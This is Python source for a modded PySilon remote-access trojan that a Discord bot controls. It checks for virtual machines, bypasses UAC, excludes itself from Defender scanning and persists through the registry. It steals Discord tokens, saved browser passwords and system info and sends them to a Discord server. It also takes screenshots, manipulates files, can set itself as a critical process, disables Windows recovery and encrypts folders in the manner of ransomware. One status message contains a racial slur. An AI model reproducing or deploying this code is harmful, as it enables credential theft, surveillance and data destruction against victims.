#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
#PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )

import time
import os
try: os.mkdir('logs') # 
except: pass # 
from PIL import ImageGrab
from shutil import copy2, rmtree
import winreg
from itertools import islice
from pathlib import Path
from cryptography.fernet import Fernet
import pickle
import psutil
from resources.discord_token_grabber import *
from resources.passwords_grabber import *
from browser_history import get_history
from resources.get_cookies import *
from urllib.request import urlopen
from threading import Thread
import pyaudio
from psutil import process_iter, Process
from win32process import GetWindowThreadProcessId
from win32gui import GetForegroundWindow
import pygame.camera
import pygame.image
import time
import pyautogui
import numpy as np
import imageio
from pynput import keyboard, mouse
from PIL import Image, ImageDraw
from win32print import * 
from win32gui import *
from win32con import *
from win32api import *
import random
import math
import json
from resources.protections import protection_check, fake_mutex_code # [pysilon_mark] !anti-vm
from resources.discord_token_grabber import * # [pysilon_mark] !grabber
from resources.passwords_grabber import * # [pysilon_mark] !grabber
from urllib.request import urlopen
from resources.uac_bypass import *
from itertools import islice
from resources.misc import *
from getpass import getuser
from shutil import rmtree
import subprocess
import threading
import discord
import asyncio
import base64
import psutil
import json
import sys
import re
if protection_check(): # [pysilon_mark] !anti-vm
    os._exit(0) # [pysilon_mark] !anti-vm
if not IsAdmin():
    if GetSelf()[1]:
        if UACbypass():
            os._exit(0)
auto = 'auto'
bot_tokens = ['zdWTxdUeBRTd2UXeZJFbE1mMl1UcVF1bzkkSrB1ZjZnMx5WLIRlLycXVBR0RuEkT6VEVNpXWU1EeJR0T1EERNdXQU5UNJRVT']
software_registry_name = 'evasionpysilon'
software_directory_name = 'evasionpysilon'
software_executable_name = 'evasionpysilon.exe'
channel_ids = {                                                    ##
    'fo': auto,                                                  ##
    'man': auto,                                                  ##
    'sam': auto,                                                  ##
    'fl': auto,                                                  ##
    'recrdngs': auto,                                            ##
    'voice': True
}                                                                  ##
secret_key = '5024ac109c26a11ef80a3f7ed821e2c4616760ac328c193e38923a336aeb6a03'
guild_id = 1295000909591478353
if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower() != software_executable_name.lower(): # [pysilon_mark] !anti-vm
    os._exit(0) # [pysilon_mark] !anti-vm
if IsAdmin():
    exclusion_paths = [f'C:\\Users\\{getuser()}\\{software_directory_name}']
    for path in exclusion_paths:
        try:
            subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{path}"'], creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass
client = discord.Client(intents=discord.Intents.all())
bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
discord.opus.load_opus(opuslib_path)
ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
text_buffor, force_to_send = '', False
messages_to_send, files_to_send, embeds_to_send = [], [], []
processes_messages, processes_list, process_to_kill = [], [], ''
files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
cookies_thread, implode_confirmation, cmd_messages = None, None, []
send_recordings, input_blocked, clipper_stop, turned_off, custom_message_to_send = True, False, True, False, [None, None, None]
latest_messages_in_recordings = []
if IsAdmin():
    regbase = winreg.HKEY_LOCAL_MACHINE
else:
    regbase = winreg.HKEY_CURRENT_USER
if sys.argv[0].lower() != f'c:\\users\\{getuser()}\\{software_directory_name.lower()}\\{software_executable_name.lower()}' and not os.path.exists(f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}'):
    try:
        os.mkdir(f'C:\\Users\\{getuser()}\\{software_directory_name}')
        # Répertoire créé avec succès
    except:
        pass
    copy2(sys.argv[0], f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
    # Le fichier a été copié dans le répertoire utilisateur
    registry = winreg.ConnectRegistry(None, regbase)
    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    winreg.CreateKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
    winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
    # Ajout de l'entrée dans le registre pour démarrer au lancement
    winreg.CloseKey(registry_key)
    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', 'w', encoding='utf-8') as activator:
        process_name = sys.argv[0].split('\\')[-1]
        attrib_value = "attrib +s +h ." if IsAdmin() else "attrib +h ."
        activator.write(f'pushd "C:\\Users\\{getuser()}\\{software_directory_name}"\n{attrib_value}\nstart "" "{software_executable_name}"\ntaskkill /f /im "{process_name}"\ndel "%~f0"')
        # Script d'activation généré
    subprocess.Popen(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW)
    # Exécution du script d'activation
    sys.exit(0)
working_directory = ['C:', 'Users', getuser(), software_directory_name]
@client.event
async def on_ready():
    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread, latest_messages_in_recordings
    hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()
    first_run = True
    for category_name in client.get_guild(guild_id).categories:
        if hwid in str(category_name):
            first_run, category = False, category_name
            break
    if not first_run:
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)
        if 'sam' not in category_channel_names and channel_ids['sam']: 
            temp = await client.get_guild(guild_id).create_text_channel('sam', category=category)
            channel_ids['sam'] = temp.id
        if 'recrdngs' not in category_channel_names and channel_ids['recrdngs']: 
            temp = await client.get_guild(guild_id).create_text_channel('recrdngs', category=category)
            channel_ids['recrdngs'] = temp.id
        if 'fl-related' not in category_channel_names and channel_ids['fl']: 
            temp = await client.get_guild(guild_id).create_text_channel('fl-related', category=category)
            channel_ids['fl'] = temp.id
        if 'Live mcrphne' not in category_channel_names and channel_ids['voice']: 
            temp = await client.get_guild(guild_id).create_voice_channel('Lve mcrphne', category=category)
            channel_ids['voice'] = temp.id
    if first_run:
        category = await client.get_guild(guild_id).create_category (hwid)
        temp = await client.get_guild(guild_id).create_text_channel('fo', category=category); channel_ids['fo'] = temp.id 
        temp = await client.get_guild(guild_id).create_text_channel('man', category=category); channel_ids['man'] = temp.id
        if channel_ids['sam'] == True: temp = await client.get_guild(guild_id).create_text_channel('sam', category=category); channel_ids['sam'] = temp.id
        if channel_ids['recrdngs'] == True: temp = await client.get_guild(guild_id).create_text_channel('recrdngs', category=category); channel_ids['recrdngs'] = temp.id
        if channel_ids['fl'] == True: temp = await client.get_guild(guild_id).create_text_channel('fl-related', category=category); channel_ids['fl'] = temp.id
        if channel_ids['voice'] == True: temp = await client.get_guild(guild_id).create_voice_channel('Live mcrphne', category=category); channel_ids['voice'] = temp.id
        try: 
            await client.get_channel(channel_ids['fo']).send('```Iress: ' + urlopen('https://youtube.com').read().decode('utf-8') + ' [youtube.com]```')
        except: pass
        try:
            await client.get_channel(channel_ids['fo']).send('```ress: ' + urlopen('https:/youtube.com').read().decode('utf-8') + ' [youtube.com]```')
        except: pass
        system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
        chunk = ''
        for line in system_info.split('\n'):
            if len(chunk) + len(line) > 1990:
                await client.get_channel(channel_ids['fo']).send('```' + chunk + '```')
                chunk = line + '\n'
            else:
                chunk += line + '\n'
        await client.get_channel(channel_ids['fo']).send('```' + chunk + '```') 
        accounts = grab_discord.initialize(False) # [pysilon_mark] !grabber
        for account in accounts: # [pysilon_mark] !grabber
            reaction_msg = await client.get_channel(channel_ids['fo']).send(embed=account); await reaction_msg.add_reaction('📌') # [pysilon_mark] !grabber
        result = grab_passwords() # [pysilon_mark] !grabber
        embed=discord.Embed(title='Grbbed sved psswrds', color=0x0084ff) # [pysilon_mark] !grabber
        for url in result.keys(): # [pysilon_mark] !grabber
            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False) # [pysilon_mark] !grabber
        reaction_msg = await client.get_channel(channel_ids['fo']).send(embed=embed); await reaction_msg.add_reaction('📌') # [pysilon_mark] !grabber
    else:
        for channel in category.channels:
            if channel.name == 'fo':
                channel_ids['fo'] = channel.id
            elif channel.name == 'man':
                channel_ids['man'] = channel.id
            elif channel.name == 'sam':
                channel_ids['sam'] = channel.id
            elif channel.name == 'fl-related':
                channel_ids['fl'] = channel.id
            elif channel.name == 'recrdngs':
                channel_ids['recrdngs'] = channel.id
            elif channel.name == 'Lve mcrphne':
                channel_ids['voice'] = channel.id
    await client.get_channel(channel_ids['man']).send(f"_ _\n_ _\n_ _```Nigger  {current_time(True)} on lolipop:{' Cc!' if IsAdmin() else ''}```\n_ _\n_ _\n_ _")
    threading.Thread(target=process_blacklister).start()
    while True:
        global send_recordings
        recordings_obj = client.get_channel(channel_ids['recrdngs'])
        async for latest_message in recordings_obj.history(limit=2):
            latest_messages_in_recordings.append(latest_message.content)
        if 'disable' in latest_messages_in_recordings:
            send_recordings = False
        else:
            send_recordings = True
        latest_messages_in_recordings = []
        if len(messages_to_send) > 0:
            for message in messages_to_send:
                await client.get_channel(message[0]).send(message[1])
                await asyncio.sleep(0.1)
            messages_to_send = []
        if len(files_to_send) > 0:
            for file in files_to_send:
                await client.get_channel(file[0]).send(file[1], file=discord.File(file[2], filename=file[2]))
                await asyncio.sleep(0.1)
                if file[3]:
                    subprocess.run('del ' + file[2], shell=True)
            files_to_send = []
        if len(embeds_to_send) > 0:
            for embedd in embeds_to_send:
                if len(embedd) == 3:
                    await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1], color=0x0084ff).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
                else:
                    await client.get_channel(embedd[0]).send(embed=embedd[1])
                await asyncio.sleep(0.1)
            embeds_to_send = []
        await asyncio.sleep(1)
@client.event
async def on_raw_reaction_add(payload):
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    user = payload.member
    if user.bot == False:
        if str(reaction) == '📌':
            if message.channel.id in channel_ids.values():
                await message.pin()
                last_message = await discord.utils.get(message.channel.history())
                await last_message.delete()
        elif str(reaction) == '🔴':
            await message.delete()
@client.event
async def on_reaction_add(reaction, user):
    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, expectation, cmd_messages, custom_message_to_send
    if user.bot == False:
        if reaction.message.channel.id in channel_ids.values():
            try:
                if str(reaction) == '💀' and expectation == 'implosion':
                    await reaction.message.channel.send('```PIPI will try to disapear after sending this message. So if there\'s no more mesages, the cleanup happened.```')
                    registry = winreg.ConnectRegistry(None, regbase)
                    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
                    registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
                    winreg.DeleteValue(registry_key, software_registry_name)
                    secure_delete_file(f'C:\\Users\\{getuser()}\\{software_directory_name}\\PySilon.key', 10)
                    try:
                        rmtree('rec_')
                    except:
                        pass
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                    with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
                        if IsAdmin(): attrib_value = f'attrib -s -h "C:\\Users\\{getuser()}\\{software_directory_name}"'
                        else: attrib_value = f'attrib -h "C:\\Users\\{getuser()}\\{software_directory_name}"'
                        imploder.write(f'pushd "C:\\Users\\{getuser()}"\n{attrib_value}\ntaskkill /f /im "{software_executable_name}"\ntimeout /t 3 /nobreak\nrmdir /s /q "C:\\Users\\{getuser()}\\{software_directory_name}"\ndel "%~f0"')
                    subprocess.Popen(f'C:\\Users\\{getuser()}\\implode.bat', creationflags=subprocess.CREATE_NO_WINDOW)
                    sys.exit(0)
                elif str(reaction) == '🔴' and expectation == 'implosion':
                    expectation = None
                elif str(reaction) == '🔴' and reaction.message.content[:15] == '```End of tree.':
                    for i in tree_messages:
                        try:
                            await i.delete()
                        except:
                            pass
                    tree_messages = []
                    subprocess.run('del ' + f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)
                elif str(reaction) == '📥' and reaction.message.content[:15] == '```End of tree.':
                    await reaction.message.channel.send(file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt'))
                    subprocess.run('del ' + f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)
                elif str(reaction) == '💀' and reaction.message.content[:39] == '```Do you really want to kill process: ':
                    await reaction.message.delete()
                    try:
                        process_name = process_to_kill[0]
                        if process_name[-1] == ']':
                            process_name = process_name[::-1]
                            for i in range(len(process_name)):
                                if process_name[i] == '[':
                                    process_name = process_name[i+4:]
                                    break
                            process_name = process_name[::-1]
                    except Exception as e:
                        embed = discord.Embed(title="📛 Error",description=f'```Error while parsing the process name...\n' + str(e) + '```', colour=discord.Colour.red())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        reaction_msg = await reaction.message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                    try:
                        killed_processes = []
                        for proc in process_iter():
                            if proc.name() == process_name:
                                proc.kill()
                                killed_processes.append(proc.name())
                        processes_killed = ''
                        for i in killed_processes:
                            processes_killed = processes_killed + '\n• ' + str(i)
                        embed = discord.Embed(title="🟢 Success",description=f'```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed + '```', colour=discord.Colour.green())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        reaction_msg = await reaction.message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                    except Exception as e:
                        embed = discord.Embed(title="📛 Error",description='```Error while killing processes...\n' + str(e) + '```', colour=discord.Colour.red())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        reaction_msg = await reaction.message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                elif str(reaction) == '🔴' and reaction.message.content[-25:] == '.kill <process-number>```':
                    for i in processes_messages:
                        try: await i.delete()
                        except: pass
                    processes_messages = []
                elif str(reaction) == '🔴' and reaction.message.content == '```End of command stdout```':
                    for i in cmd_messages:
                        await i.delete()
                    cmd_messages = []
            except Exception as err:
                await reaction.message.channel.send(f'```{str(err)}```')
@client.event
async def on_raw_reaction_remove(payload):
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    user = payload.member
    if str(reaction) == '📌':
        await message.unpin()
@client.event
async def on_message(message):
    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop, input_blocked, custom_message_to_send, turned_off
    if message.author != client.user:
        if message.content == f'<@{client.user.id}>':
            await client.get_channel(channel_ids['man']).send(f'<@{message.author.id}>')
        if message.channel.id in channel_ids.values():
            if message.content == '.implode':
                await message.delete()
                await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here Pipi.key generated along with RAT executable```\n\n')
                expectation = 'key'
            elif message.content == '.restart':
                await message.delete()
                await message.channel.send('```pipi will be retarted now... Sta by...```')
                os.startfile(f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
                sys.exit(0)
            elif message.content[:5] == '.help':
                await message.delete()
                if message.content.strip() == '.help':
                    embed = discord.Embed(title='List of all available commands', color=0x49fc03)
                    for i in help['commands'].keys():
                        embed.add_field(name=help['commands'][i][0], value=help['commands'][i][1], inline=False)
                    await message.channel.send(embed=embed)
                    embed = discord.Embed(color=0x49fc03)
                    for i in help['commands2'].keys():
                        embed.add_field(name=help['commands2'][i][0], value=help['commands2'][i][1], inline=False)
                    await message.channel.send(embed=embed)
            elif message.content == '.set-critical':
                await message.delete()
                try:
                    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
                    embed = discord.Embed(title="🟣 System",description=f'```Process elevated to critical status successfully.\nWarning: This critical process can cause of BSOD when the tim tries to shut down their system.```', colour=discord.Colour.purple())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                except: 
                    await message.channel.send('`Something went wrong while elevating the process`')
            elif message.content == '.unset-critical':
                await message.delete()
                try:
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                    embed = discord.Embed(title="🟣 System",description=f'```Successfully removed critical status from process.```', colour=discord.Colour.purple())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                except: 
                    await message.channel.send('`Something went wrong while removing critical status`')
            elif message.content == '.disable-reset':
                await message.delete()
                if IsAdmin():
                    subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
                    embed = discord.Embed(title="🟣 System",description=f'```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```Disabling REAgentC requires elevation.```', colour=discord.Colour.purple())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content == '.enable-reset':
                await message.delete()
                if IsAdmin():
                    subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
                    embed = discord.Embed(title="🟣 System",description=f'```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```Enabling REAgentC requires elevation.```', colour=discord.Colour.purple())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif expectation == 'key':
                try:
                    split_v1 = str(message.attachments).split("filename='")[1]
                    filename = str(split_v1).split("' ")[0]
                    filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                    await message.attachments[0].save(fp=filename)
                    if get_file_hash(filename) == secret_key:
                        reaction_msg = await message.channel.send('```Appuie sur  "💀".\nWARNING! Si tu veuannuler appuie "🔴".```')
                        await reaction_msg.add_reaction('💀')
                        await reaction_msg.add_reaction('🔴')
                        expectation = 'implosion'
                    else:
                        reaction_msg = await message.channel.send('```❗ Provideky is ivalid```'); await reaction_msg.add_reaction('🔴')
                        expectation = None
                except Exception as err: 
                    await message.channel.send(f'```❗ Someting went wong while etching secret key...\n{str(err)}```')
                    expectation = None
            elif message.content == '.s':
                await message.delete()
                ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\s.png')
                reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On dmnd]`', color=0x0084ff).set_image(url='attachment://s.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\s.png'))
                await reaction_msg.add_reaction('📌')
                subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\s.png', shell=True)
            elif message.content[:7] == '.remove':
                await message.delete()
                if message.channel.id == channel_ids['fl']:
                    if message.content.strip() == '.remove':
                        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .remove <file-or-directory>```', colour=discord.Colour.red())
                        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
                            try:
                                if os.path.isfile('/'.join(working_directory) + '/' + message.content[8:]):
                                    subprocess.run('del "' + '\\'.join(working_directory) + '\\' + message.content[8:] + '"', shell=True)
                                else:
                                    rmtree('/'.join(working_directory) + '/' + message.content[8:])
                                embed = discord.Embed(title="🟢 Success",description=f'```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```', colour=discord.Colour.green())
                                embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                            except Exception as error:
                                embed = discord.Embed(title="📛 Error",description=f'`' + str(error) + '`', colour=discord.Colour.red())
                                embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                        else:
                            embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
                            embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title="📛 Error",description=f'||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['fl']) + '>❗\n||-||', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content == '.clear':
                await message.delete()
                if message.channel.id == channel_ids['fl']:
                    async for message in client.get_channel(channel_ids['fl']).history():
                        await message.delete()
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['fl']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content == '.tree':
                await message.delete()
                if message.channel.id == channel_ids['fl']:
                    tree_messages = []
                    tree_txt_path = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + 'tree.txt'
                    dir_path = Path('/'.join(working_directory))
                    tree_messages.append(await message.channel.send('```Directory tree requested by ' + str(message.author) + '\n\n' + '/'.join(working_directory) + '```'))
                    with open(tree_txt_path, 'w', encoding='utf-8') as system_tree:
                        system_tree.write(str(dir_path) + '\n')
                    length_limit = sys.maxsize
                    iterator = tree(Path('/'.join(working_directory)))
                    tree_message_content = '```^\n'
                    for line in islice(iterator, length_limit):
                        with open(tree_txt_path, 'a+', encoding='utf-8') as system_tree:
                            system_tree.write(line + '\n')
                        if len(tree_message_content) > 1800:
                            tree_messages.append(await message.channel.send(tree_message_content + str(line) + '```'))
                            tree_message_content = '```'
                        else:
                            tree_message_content += str(line) + '\n'
                    if tree_message_content != '```':
                        tree_messages.append(await message.channel.send(tree_message_content + '```'))
                    reaction_msg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
                    await reaction_msg.add_reaction('📥')
                    await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['fl']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content[:3] == '.cd':
                await message.delete()
                if message.channel.id == channel_ids['fl']:
                    if message.content.strip() == '.cd':
                        reaction_msg = await message.channel.send('```Syntax: .cd <directory>```'); await reaction_msg.add_reaction('🔴')
                    else:
                        if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
                            if '/' in message.content:
                                for dir in message.content[4:].split('/'):
                                    if dir == '..':
                                        working_directory.pop(-1)
                                    else:
                                        working_directory.append(dir)
                            else:
                                if message.content[4:] == '..':
                                    working_directory.pop(-1)
                                else:
                                    working_directory.append(message.content[4:])
                            reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                        else:
                            if os.path.isdir(message.content[4:]):
                                working_directory.clear()
                                for dir in message.content[4:].split('/'):
                                    working_directory.append(dir)
                                reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                            else:
                                reaction_msg = await message.channel.send('```❗ Directory not found.```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This comand wors only on fielated channel:` <#' + str(channel_ids['fl']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content == '.ls':
                await message.delete()
                if message.channel.id == channel_ids['fl']:
                    dir_content_f, dir_content_d, directory_content = [], [], []
                    for element in os.listdir('/'.join(working_directory)+'/'):
                        if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
                        else: dir_content_d.append(element)
                    dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)
                    for single_directory in dir_content_d: directory_content.append(single_directory)
                    for single_file in dir_content_f: directory_content.append(single_file)
                    await message.channel.send('```Content of ' + '/'.join(working_directory) +'/ at ' + current_time() + '```')
                    lsoutput = directory_content
                    while lsoutput != []:
                        if len('\n'.join(lsoutput)) > 1994:
                            temp = ''
                            while len(temp+lsoutput[0])+1 < 1994:
                                temp += lsoutput[0] + '\n'
                                lsoutput.pop(0)
                            await message.channel.send('```' + temp + '```')
                        else:
                            await message.channel.send('```' + '\n'.join(lsoutput) + '```')
                            lsoutput = []
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['fl']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content == '.pwd':
                await message.delete()
                if message.channel.id == channel_ids['fl']:
                    reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['fl']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content[:8] == '.encrypt':
                await message.delete()
                if message.content.strip() == '.encrypt':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .encrypt <path to folder>```', colour=discord.Colour.red())
                    embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    folder_path = message.content[9:]
                    folder_path = folder_path.replace('\\','/')
                    current_pid = os.getpid()
                    running_processes = set()
                    for process in psutil.process_iter(['pid', 'name']):
                        try:
                            if process.info['pid'] != current_pid:
                                running_processes.add(process.info['name'])
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                    key = Fernet.generate_key()
                    cipher_suite = Fernet(key)
                    original_file_extensions = []
                    for root, dirs, files in os.walk(folder_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            if not file_path.endswith('.pysilon'):
                                _, file_extension = os.path.splitext(file_path)
                                if os.path.basename(file_path) not in running_processes:
                                    with open(file_path, 'rb') as f:
                                        file_data = f.read()
                                    original_file_extensions.append(file_extension)
                                    encrypted_data = cipher_suite.encrypt(file_data)
                                    new_file_name = os.path.splitext(file_path)[0] + '.pysilon'
                                    os.rename(file_path, new_file_name)
                                    with open(new_file_name, 'wb') as f:
                                        f.write(encrypted_data)
                    if original_file_extensions:
                        with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', 'wb') as ext_file:
                            pickle.dump(original_file_extensions, ext_file)
                    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', 'wb') as key_file:
                        key_file.write(key)
